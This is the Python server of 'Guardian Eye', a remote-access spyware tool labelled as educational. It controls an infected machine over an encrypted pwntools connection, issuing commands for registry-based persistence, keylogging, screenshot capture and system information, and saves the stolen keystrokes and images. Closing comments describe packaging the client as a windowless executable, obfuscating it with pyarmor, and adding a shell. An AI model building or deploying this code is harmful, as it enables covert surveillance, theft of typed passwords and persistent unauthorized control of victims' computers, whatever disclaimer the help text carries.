try:
    from pwn import *
    from termcolor import colored
    from cryptography.fernet import Fernet
    import pickle
    import uuid
except ModuleNotFoundError as error:
    print(f"[-] Missing essential library/s, please install it using 'pip' : {error}")

def wait_for_client_connection(host, port):
    l = listen(port, bindaddr=host)
    print(f"[!] Server awaiting target on port {port}")
    try:
        conn = l.wait_for_connection()
        return conn # Return connection and remote connection
    except PwnlibException as pwne:
        print(colored(f"[-] A PWN exception was caught : {pwne}", "red"))
        return False
    except Exception as e:
        print(colored(f"[-] An unknown error has occured when connecting : {e}", "red"))
        return False

def show_help_dialogue():
    help_text = """
    Guardian Eye (Version 1.0) - Usage Manual
    
    Overview:
    -> Guardian Eye is a basic spyware program for ethical hacking & cybersecurity education. 
    -> Guardian Eye focuses on keystroke recording and backdoor persistence with encrypted communication.
    
    Commands:
    - help: Shows this manual.
    - kill: Ends target system connection.
    - persist: Installs a backdoor in the registry for auto-start (For windows machines).
    - keylog_start: Starts keystroke logging, use 'ctrl+c' to exit the program
    - screenshot: Captures screenshot of target PC and sends it to server.
    - sys_info: Gets simple system information of target.
    
    Encryption:
    -> Communication with the target is encrypted to simulate and secure spyware activities.
    
    Guidelines:
    -> Use with explicit permission for educational purposes within legal and ethical hacking frameworks.
    -> Unauthorized use or deployment on systems without explicit consent is illegal and may result in criminal charges, including potential imprisonment.
    """
    print(colored(help_text, "yellow"))
    
def show_banner():
    banner = """
  _____                 ___               ____           
 / ___/_ _____ ________/ (_)__ ____      / __/_ _____    
/ (_ / // / _ `/ __/ _  / / _ `/ _ \    / _// // / -_)   
\___/\_,_/\_,_/_/  \_,_/_/\_,_/_//_/   /___/\_, /\__/    
                                           /___/         
                ⠀⠀⠀⠀⣀⣤⡤⠤⠶⠤⢤⣄⣀⠀⠀⠀
                ⠀⢀⡴⠛⣉⣠⣤⣴⣶⠶⣤⣄⡉⠳⢄⠀
                ⠀⢀⣴⠞⢹⠃⢰⣿⣧⣀⡄⠙⡟⢷⡀⠀
                ⢠⣾⠁⠀⢸⡄⠘⠿⣿⠿⠃⢰⠇⠀⢻⣄
                ⠹⠿⣤⡀⠀⠙⠶⢤⣤⡤⠖⠃⢀⣠⡾⠟
                ⠀⠀⠀⢉⠛⠒⠶⠶⠶⠶⠶⠚⢋⠁⠀⠀
                ⠀⠀⢰⠟⣆⠀⠀⣠⢷⡀⠀⢀⡞⢧⠀⠀
                ⠀⠀⣟⠀⣹⠀⢰⠏⠈⢷⠀⢸⡁⢘⡇⠀
                ⠀⠀⠈⠛⠁⠀⢸⡰⡀⣸⠂⠀⠙⠋⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠉⠛⠁⠀⠀⠀⠀⠀⠀                                                                                                                                                                     
    """
    message = colored("Eyes on the unforseen - Type 'help' for program usage", color="blue", attrs=["bold"])
    print(colored(banner+"\n"+message, "blue"))

def encrypt_message(command, key):
    try:
        encMessage = key.encrypt(command.encode())
    except:
        encMessage = "" # Default Value
    return encMessage  

def decrypt_client_message(encrypted_message, key):  
    try:  
        decMessage = key.decrypt(encrypted_message)
        try:
            decMessage = decMessage.decode()
        except UnicodeDecodeError:
            try:
                decMessage = pickle.loads(decMessage)
            except pickle.UnpicklingError:
                pass 
    except:
        decMessage = "" 

    return decMessage 

def receive_screenshot(conn, key):
    random_image_filename = "screenshot_data_"+str(uuid.uuid4())[:8] + ".png"
    try:
        data_size = int.from_bytes(conn.recv(8), 'big')
        encrypted_screenshot_data = b''
        while len(encrypted_screenshot_data) < data_size:
            chunk = conn.recv(min(4096, data_size - len(encrypted_screenshot_data)))
            if not chunk:
                return "empty"
            encrypted_screenshot_data += chunk
        
        decrypted_screenshot_data = decrypt_client_message(encrypted_screenshot_data, key)
        if not isinstance(decrypted_screenshot_data, bytes):
            screenshot = decrypted_screenshot_data
        else:
            screenshot = pickle.loads(decrypted_screenshot_data)

        # Save the screenshot
        screenshot.save(random_image_filename)
        return colored(f"[+] Screenshot {random_image_filename} saved successfully! - Saved in the same program directory", "green")
    except Exception as e:
        return colored(f"[-] Failed to capture screenshot of target: {e}. Try again", "red")

def keylog_start_command(conn, static_key):
    random_text_filename = "keylogger_log_"+str(uuid.uuid4())[:4] + ".txt"
    
    while True:
        try:
            with open(random_text_filename, "a") as keystrokes:
                keystrokes.write(decrypt_client_message(conn.recv(timeout=50), static_key))
        except KeyboardInterrupt:
            break

    return f"[+] Keystrokes saved in file : '{random_text_filename}'"
    
def persist_command(conn, static_key):
    decrypted_client_message = decrypt_client_message(conn.recv(), static_key)   
    
    if decrypted_client_message == "created":
        return colored("[+] Persistance installed on target machine. Guardian Eye backdoor is now active", "green")
    elif decrypted_client_message == "not_windows":
        return colored("[-] Target is not using a windows machine, persistance will not work", "red")
    elif decrypted_client_message == "already_created":
        return colored("[-] Target already has persistance active", "red")
    else:
        return colored("[-] An unidentified error has occured when attempting to create persistance", "red")  

def screenshot_command(conn, static_key):
    screenshot_data = receive_screenshot(conn, static_key)
    if screenshot_data == "empty":
        return colored("[-] No data has been recieved, please try again", "red")
    else:
        return screenshot_data
    
def sys_info_command(conn, static_key):  
    decrypted_client_message = decrypt_client_message(conn.recv(), static_key)   
    if decrypted_client_message == "not_windows":
        return colored("[-] Target is not running on a Windows machine, unable to gather system details", "red")
    
    if isinstance(decrypted_client_message, list):
        if decrypted_client_message == "no_information":
            return colored("[-] Unable to retrieve target information", "red")
        
        result = []
        for info in decrypted_client_message:
            if "No information found" in info:
                result.append(colored(f"[-] {info}", "red"))
            else:
                result.append(colored(f"[+] {info}", "green"))

        return "\n".join(result) 
    else:
        return colored("[-] Unexpected data type received", "red")

# Suppress pwnlib terminal messages to reduce clutter
context.log_level = 'critical'
    
ip_addr, port = "127.0.0.1", 5555 # Define server required variables to initiate a connection
static_key = Fernet(b'3OSmBSCGoSIjSa5eZ1DEM4MW92p8ESIUr4wSn0sz9zE=') # Static encyrption key information [Obsfurcation is needed!]
commands = ["kill", "help", "persist", "keylog_start", "keylog_end", "screenshot", "sys_info"] # Commands this application can use

# Guaradian eye banner and message
show_banner()

# Try initiate a connection with target
conn = wait_for_client_connection(ip_addr, port)
if conn is False: exit(colored("[-] Could not connect to target, connection dropped", "red"))
  
print(colored("\n[+] CONNECTION HOOKED TO TARGET", "green"))
print("[!] All transmissions are now encyrpted")

while True:
    print("\n") # Seperate above clutter 
    # Server communicating to target
    try:
        command = input(colored("Guardian Eye Input > ", attrs=['bold'])).lower()
    except KeyboardInterrupt:
        conn.send(encrypt_message("kill", static_key))
        break
    
    # Server essential commands
    if command not in commands:
        print("[!] Invalid command, please refer to manual by typing 'help'")
        continue
    elif command == "kill":
        conn.send(encrypt_message("kill", static_key))
        break
    elif command != "help": 
        conn.send(encrypt_message(command, static_key))
    elif command == "help":
        show_help_dialogue()  
    
    # Server main commands
    if command == "sys_info":
        print("[!] Gathering target system information")
        sys_info_output = sys_info_command(conn, static_key)
        
        print(sys_info_output)
        
    elif command == "persist":
        print("[!] Creating persistance on target")
        persist_output = persist_command(conn, static_key)
        
        print(persist_output)
     
    elif command == "keylog_start": # Function not working, to fix
        print(colored("[!] Keylogger started on client, Listening on keystrokes [Press ctrl+c to stop]", "green"))
        try:
            keylog_output = keylog_start_command(conn, static_key)
        except EOFError as err:
            print(colored(f"[-] An internal problem occured when handling the log file : {err}\nExiting keylogger . . .", "red"))
            continue
        
        print(keylog_output)
        
    elif command == "screenshot":
        print("[!] Waiting for screenshot data")
        screenshot_output = screenshot_command(conn, static_key) 
        
        print(screenshot_output)     

print(colored("[+] Connection to target closed successfully", "green")) 
conn.close()

# Convert file to executable : "pyinstaller --onefile --noconsole client.py" (Make sure it compiles all the libraries, check that out!)
# Use "pyarmor" to obsfscure client source code : "pyarmor pack -x " --onefile --noconsole" client.py"
# Persist path: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

# CREATE A SHELL! (use pwd>)